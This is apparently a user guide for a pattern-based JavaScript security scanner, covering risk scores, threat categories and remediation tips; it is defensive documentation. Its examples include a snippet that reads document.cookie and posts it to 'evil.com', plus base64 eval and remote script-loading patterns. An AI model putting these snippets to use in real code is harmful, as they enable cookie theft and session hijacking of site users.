# Security Scanner Guide

## Overview
The Security Scanner analyzes JavaScript code for malicious patterns, dangerous code, and security vulnerabilities.

## How to Use

1. Paste or type your JavaScript code into the editor
2. Click the **🔒 Security Scan** button
3. Review the security report in the popup panel

## Security Score

- **90-100**: ✅ Safe - No significant threats
- **70-89**: ⚠️ Low Risk - Minor concerns
- **50-69**: ⚠️ Medium Risk - Potentially dangerous patterns
- **30-49**: 🚨 High Risk - Dangerous code detected
- **0-29**: 🔴 Critical Risk - Malware patterns detected

## Threat Categories

### 🔴 Malware (Critical/High)
Patterns commonly used in malicious code:
- `eval(atob(...))` - Base64 encoded code execution
- `document.write(unescape(...))` - Dynamic script injection
- `new Function(...)` - Dynamic function creation
- Cryptocurrency mining keywords
- ActiveX usage (IE exploits)

### ⚠️ Code Injection (High/Medium)
Patterns that can execute arbitrary code:
- `Function('code')()` - String to function conversion
- `setTimeout('code', ...)` - Eval-like behavior
- `innerHTML = ...` - XSS vulnerability
- Dynamic script tag creation

### 🌐 Network Activity (Medium)
Patterns indicating network communication:
- `XMLHttpRequest` / `fetch()` - HTTP requests
- `WebSocket` - Real-time connections
- `navigator.sendBeacon()` - Data transmission
- `window.location =` - Page redirections

### 📦 Data Access (High/Medium)
Patterns accessing sensitive data:
- `document.cookie` - Cookie theft
- `localStorage` / `sessionStorage` - Local data access
- Form data collection

### 🎭 Obfuscation (Low/Medium)
Heavily obfuscated code indicators:
- JSFuck patterns (`[]()!+` only)
- AAEncode (Japanese emoticons)
- JJEncode (symbol-based)
- Hex/Unicode encoding
- `_0x****` variable names

## Threat Report Details

Each detected threat includes:

1. **Description**: What was found
2. **Severity**: Critical / High / Medium / Low
3. **Type**: malware / code-injection / network / etc.
4. **Line Number**: Where in the code
5. **Recommendation**: How to fix or verify

## Example Threats

### Critical: Base64 Eval
```javascript
eval(atob('YWxlcnQoJ2hhY2tlZCcp')); // Suspicious!
```
**Risk**: Hidden malicious code  
**Recommendation**: Decode and inspect the content

### High: Cookie Access
```javascript
var stolen = document.cookie; // Potential data theft
fetch('http://evil.com', { method: 'POST', body: stolen });
```
**Risk**: Session hijacking  
**Recommendation**: Verify cookie access is legitimate

### Medium: Dynamic Script
```javascript
var s = document.createElement('script');
s.src = 'http://unknown-cdn.com/script.js';
document.body.appendChild(s);
```
**Risk**: Untrusted code execution  
**Recommendation**: Verify script source is trusted

## Best Practices

1. **Always scan untrusted code** before running it
2. **Review all Critical/High threats** carefully
3. **Decode obfuscated code** to see what it actually does
4. **Check network endpoints** in Medium threats
5. **Use in development** to catch accidental vulnerabilities

## Limitations

- Cannot detect **all** malware (no tool is 100%)
- Pattern-based detection (false positives possible)
- Doesn't execute code (static analysis only)
- Best used as **first line of defense**

## When to Be Concerned

🚨 **Immediate Red Flags**:
- Multiple Critical threats
- Security score below 50
- Obfuscated network requests
- Eval with encoded strings
- Cryptocurrency keywords + network activity

⚠️ **Review Carefully**:
- Medium threats in production code
- Cookie/localStorage access in third-party scripts
- Dynamic script loading from unknown sources

## False Positives

Some legitimate code may trigger warnings:

✅ **Analytics scripts** (Google Analytics, etc.)
- May access cookies, localStorage
- May make network requests
- **Verify**: Check the destination URLs

✅ **CDN-loaded libraries**
- Dynamic script creation is normal
- **Verify**: Check the CDN domain is official

✅ **Legitimate obfuscation**
- Some frameworks minify/obfuscate code
- **Verify**: Check it's from a trusted source

## Integration Tips

1. **Pre-deployment scanning**: Scan all JavaScript before deploying
2. **Third-party code**: Always scan external scripts
3. **Code review**: Use as part of security code review
4. **Education**: Share threat reports with team

## Technical Details

The scanner checks for:
- 40+ malware and dangerous patterns
- Regular expression pattern matching
- Line-by-line analysis
- Cumulative threat scoring
- Context-aware recommendations

Patterns database includes:
- Real-world malware samples
- Common attack vectors
- Obfuscation techniques
- Vulnerability patterns

---

**Remember**: This tool helps identify suspicious code, but human review is always necessary for final security decisions.
